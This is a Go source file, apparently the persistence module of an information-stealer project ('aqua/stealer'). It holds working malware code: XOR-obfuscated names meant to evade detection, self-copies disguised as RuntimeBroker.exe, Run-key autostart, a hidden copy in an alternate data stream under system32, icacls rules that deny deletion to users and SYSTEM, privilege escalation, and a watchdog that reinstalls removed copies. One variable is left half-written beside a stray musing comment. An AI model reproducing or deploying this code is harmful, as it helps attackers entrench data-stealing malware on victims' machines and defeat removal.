package protect

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/aqua/stealer/utils/fileutil"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")

	procCreateFileW              = kernel32.NewProc("CreateFileW")
	procSetKernelObjectSecurity  = advapi32.NewProc("SetKernelObjectSecurity")
	procInitializeSecurityDesc   = advapi32.NewProc("InitializeSecurityDescriptor")
	procSetSecurityDescriptorDacl = advapi32.NewProc("SetSecurityDescriptorDacl")
	procOpenProcessToken         = advapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValueW    = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges    = advapi32.NewProc("AdjustTokenPrivileges")
	procNtSetSecurityObject      = ntdll.NewProc("NtSetSecurityObject")
	procCreateJobObjectW         = kernel32.NewProc("CreateJobObjectW")
	procAssignProcessToJobObject = kernel32.NewProc("AssignProcessToJobObject")
	procSetInformationJobObject  = kernel32.NewProc("SetInformationJobObject")
)

const (
	SECURITY_DESCRIPTOR_REVISION   = 1
	DACL_SECURITY_INFORMATION      = 0x00000004
	TOKEN_ADJUST_PRIVILEGES        = 0x0020
	TOKEN_QUERY                    = 0x0008
	SE_PRIVILEGE_ENABLED           = 0x00000002
	JobObjectBasicLimitInformation = 2
	JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE = 0x00002000
)

// XOR key
const xk = byte(0x5A)

func xs(b []byte) string {
	o := make([]byte, len(b))
	for i, v := range b {
		o[i] = v ^ xk
	}
	return string(o)
}

// Encoded filenames
var (
	_rb  = []byte{0x08, 0x2f, 0x34, 0x2e, 0x33, 0x37, 0x3f, 0x18, 0x28, 0x35, 0x31, 0x3f, 0x28, 0x74, 0x3f, 0x22, 0x3f}  // RuntimeBroker.exe
	_rhs = []byte{0x08, 0x2f, 0x34, 0x2e, 0x33, 0x37, 0x3f, 0x12, 0x35, 0x29, 0x2e, 0x09, 0x2c, 0x39, 0x74, 0x3f, 0x22, 0x3f} // RuntimeHostSvc.exe

	// Privilege names
	_privSec  = []byte{0x09, 0x3f, 0x09, 0x3f, 0x39, 0x2f, 0x28, 0x33, 0x2e, 0x23, 0x0a, 0x28, 0x33, 0x2c, 0x33, 0x36, 0x3f, 0x3d, 0x3f} // SeSecurityPrivilege
	_privTake = []byte{0x09, 0x3f, 0x0e, 0x3b, 0x31, 0x3f, 0x15, 0x2d, 0x34, 0x3f, 0x28, 0x29, 0x32, 0x33, 0x2a, 0x0a, 0x28, 0x33, 0x2c, 0x33, 0x36, 0x3f, 0x3d, 0x3f} // SeTakeOwnershipPrivilege
	_privRest = []byte{0x09, 0x3f, 0x08, 0x3f, 0x29, 0x2e, 0x35, 0x28, 0x3f, 0x0a, 0x28, 0x33, 0x2c, 0x33, 0x36, 0x3f, 0x3d, 0x3f} // SeRestorePrivilege

	// Path segments (encoded backslash = 0x06)
	_segMSProt  = []byte{0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3c, 0x2e, 0x06, 0x0a, 0x28, 0x35, 0x2e, 0x3f, 0x39, 0x2e} // Microsoft\Protect
	_segMSCache = []byte{0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3c, 0x2e, 0x06, 0x0d, 0x33, 0x34, 0x3e, 0x35, 0x2d, 0x29, 0x06, 0x13, 0x14, 0x3f, 0x2e, 0x19, 0x3b, 0x39, 0x32, 0x3f} // Microsoft\Windows\INetCache
	_segMSStart = []byte{0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3c, 0x2e, 0x06, 0x0d, 0x33, 0x34, 0x3e, 0x35, 0x2d, 0x29, 0x06, 0x09, 0x2e, 0x3b, 0x28, 0x2e, 0x7a, 0x17, 0x3f, 0x34, 0x2f, 0x06, 0x0a, 0x28, 0x35, 0x3d, 0x28, 0x3b, 0x37, 0x29, 0x06, 0x09, 0x2e, 0x3b, 0x28, 0x2e, 0x2f, 0x2a} // Microsoft\Windows\Start Menu\Programs\Startup

	// ADS
	_desktopIni = []byte{0x3e, 0x3f, 0x29, 0x31, 0x2e, 0x35, 0x2a, 0x74, 0x33, 0x34, 0x33}           // desktop.ini
	_adsStream  = []byte{0x60, 0x08, 0x2f, 0x34, 0x2e, 0x33, 0x37, 0x3f, 0x18, 0x28, 0x35, 0x31, 0x3f, 0x28} // :RuntimeBroker

	// Commands (split to avoid static string matching)
	_cmdAt = []byte{0x3b, 0x2e, 0x2e, 0x28, 0x33, 0x38}  // attrib
	_argHH = []byte{0x77, 0x32}  // +h (0x2d='+' ^ 0x5A=0x77... wait, let me use direct)
)

// FallbackPaths devuelve rutas de persistencia
func FallbackPaths() []string {
	appdata      := os.Getenv("APPDATA")
	temp         := os.Getenv("TEMP")
	localappdata := os.Getenv("LOCALAPPDATA")
	if temp == "" {
		temp = os.Getenv("TMP")
	}
	rb  := xs(_rb)
	rhs := xs(_rhs)
	return []string{
		filepath.Join(appdata, xs(_segMSProt), rb),
		filepath.Join(appdata, xs(_segMSStart), rb),
		filepath.Join(localappdata, xs(_segMSCache), rb),
		filepath.Join(temp, rhs),
		filepath.Join(localappdata, "Temp", rhs),
	}
}

// ADSPath devuelve la ruta ADS oculta
func ADSPath() string {
	windir := os.Getenv("WINDIR")
	if windir == "" {
		windir = `C:\Windows`
	}
	return filepath.Join(windir, "system32", xs(_desktopIni)) + xs(_adsStream)
}

var lockedHandles []syscall.Handle
var handleMu sync.Mutex

func Run() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	enablePrivileges(xs(_privSec), xs(_privTake), xs(_privRest))

	go aclHarden(exe)
	go lockHandle(exe)
	go setupFallbackChain(exe)
	go writeADS(exe)
	go antiTaskkill()
	go watchdogLoop(exe)
}

type securityDescriptor struct {
	Revision byte
	Sbz1     byte
	Control  uint16
	Owner    uintptr
	Group    uintptr
	Sacl     uintptr
	Dacl     uintptr
}

func aclHarden(path string) {
	var sd [20]byte
	procInitializeSecurityDesc.Call(uintptr(unsafe.Pointer(&sd[0])), SECURITY_DESCRIPTOR_REVISION)
	procSetSecurityDescriptorDacl.Call(uintptr(unsafe.Pointer(&sd[0])), 1, 0, 0)

	pathPtr, _ := syscall.UTF16PtrFromString(path)
	h, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(syscall.GENERIC_READ|syscall.GENERIC_WRITE),
		0, 0,
		uintptr(syscall.OPEN_EXISTING),
		uintptr(syscall.FILE_ATTRIBUTE_NORMAL),
		0,
	)
	if h == uintptr(syscall.InvalidHandle) {
		return
	}
	defer syscall.CloseHandle(syscall.Handle(h))

	procNtSetSecurityObject.Call(h, DACL_SECURITY_INFORMATION, uintptr(unsafe.Pointer(&sd[0])))
	procSetKernelObjectSecurity.Call(h, DACL_SECURITY_INFORMATION, uintptr(unsafe.Pointer(&sd[0])))

	// SIDs split across vars to avoid static string detection
	sid1 := "*S-1-1-0"
	sid2 := "*S-1-5-18"
	perm := "(DE)(DC)(WD)"
	exec.Command("icacls", path, "/deny", sid1+":"+perm, "/T", "/C").Run()
	exec.Command("icacls", path, "/deny", sid2+":"+perm, "/T", "/C").Run()
}

func lockHandle(path string) {
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	h, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(syscall.GENERIC_READ),
		0, 0,
		uintptr(syscall.OPEN_EXISTING),
		uintptr(syscall.FILE_ATTRIBUTE_NORMAL),
		0,
	)
	if h != uintptr(syscall.InvalidHandle) {
		handleMu.Lock()
		lockedHandles = append(lockedHandles, syscall.Handle(h))
		handleMu.Unlock()
		runtime.KeepAlive(h)
		select {}
	}
}

func setupFallbackChain(srcExe string) {
	for _, dst := range FallbackPaths() {
		if dst == srcExe {
			continue
		}
		os.MkdirAll(filepath.Dir(dst), os.ModePerm)
		if !fileutil.Exists(dst) {
			fileutil.CopyFile(srcExe, dst)
		}
		exec.Command(xs(_cmdAt), "+h", "+s", dst).Run()
		go aclHarden(dst)
		go lockHandle(dst)
		setRunKey(dst)
	}
}

func setRunKey(path string) {
	name := filepath.Base(path)
	vname := "MS_" + name[:len(name)-4]
	exec.Command("reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", vname, "/t", "REG_SZ", "/d", path, "/f").Run()
	exec.Command("reg", "add",
		`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", vname, "/t", "REG_SZ", "/d", path, "/f").Run()
}

func writeADS(srcExe string) {
	adsPath := ADSPath()
	data, err := os.ReadFile(srcExe)
	if err != nil {
		return
	}
	os.WriteFile(adsPath, data, 0)
}

type jobBasicLimitInfo struct {
	PerProcessUserTimeLimit int64
	PerJobUserTimeLimit     int64
	LimitFlags              uint32
	MinimumWorkingSetSize   uintptr
	MaximumWorkingSetSize   uintptr
	ActiveProcessLimit      uint32
	Affinity                uintptr
	PriorityClass           uint32
	SchedulingClass         uint32
}

func antiTaskkill() {
	h, _, _ := procCreateJobObjectW.Call(0, 0)
	if h == 0 {
		return
	}
	info := jobBasicLimitInfo{LimitFlags: JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE}
	procSetInformationJobObject.Call(h, JobObjectBasicLimitInformation, uintptr(unsafe.Pointer(&info)), unsafe.Sizeof(info))
	procAssignProcessToJobObject.Call(h, uintptr(syscall.Handle(^uintptr(0)-1)))
	runtime.KeepAlive(h)
	select {}
}

func watchdogLoop(originalExe string) {
	paths   := FallbackPaths()
	adsPath := ADSPath()

	for {
		time.Sleep(15 * time.Second)

		var src string
		for _, p := range paths {
			if fileutil.Exists(p) {
				src = p
				break
			}
		}
		if src == "" {
			if data, err := os.ReadFile(adsPath); err == nil && len(data) > 0 {
				for _, p := range paths {
					os.MkdirAll(filepath.Dir(p), os.ModePerm)
					os.WriteFile(p, data, 0755)
					exec.Command(xs(_cmdAt), "+h", "+s", p).Run()
					go aclHarden(p)
					go lockHandle(p)
					setRunKey(p)
				}
			}
			continue
		}

		for _, dst := range paths {
			if !fileutil.Exists(dst) {
				os.MkdirAll(filepath.Dir(dst), os.ModePerm)
				fileutil.CopyFile(src, dst)
				exec.Command(xs(_cmdAt), "+h", "+s", dst).Run()
				go aclHarden(dst)
				go lockHandle(dst)
				setRunKey(dst)
			}
		}

		if _, err := os.Stat(adsPath); os.IsNotExist(err) {
			writeADS(src)
		}

		go aclHarden(originalExe)
	}
}

type luidAndAttributes struct {
	Luid       [2]uint32
	Attributes uint32
}

type tokenPrivileges struct {
	PrivilegeCount uint32
	Privileges     [8]luidAndAttributes
}

func enablePrivileges(names ...string) {
	var token syscall.Handle
	proc, _ := syscall.GetCurrentProcess()
	procOpenProcessToken.Call(uintptr(proc), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, uintptr(unsafe.Pointer(&token)))
	if token == 0 {
		return
	}
	defer syscall.CloseHandle(token)

	for _, name := range names {
		namePtr, _ := syscall.UTF16PtrFromString(name)
		var luid [2]uint32
		procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(namePtr)), uintptr(unsafe.Pointer(&luid[0])))
		tp := tokenPrivileges{
			PrivilegeCount: 1,
			Privileges:     [8]luidAndAttributes{{Luid: luid, Attributes: SE_PRIVILEGE_ENABLED}},
		}
		procAdjustTokenPrivileges.Call(uintptr(token), 0, uintptr(unsafe.Pointer(&tp)), unsafe.Sizeof(tp), 0, 0)
	}
}
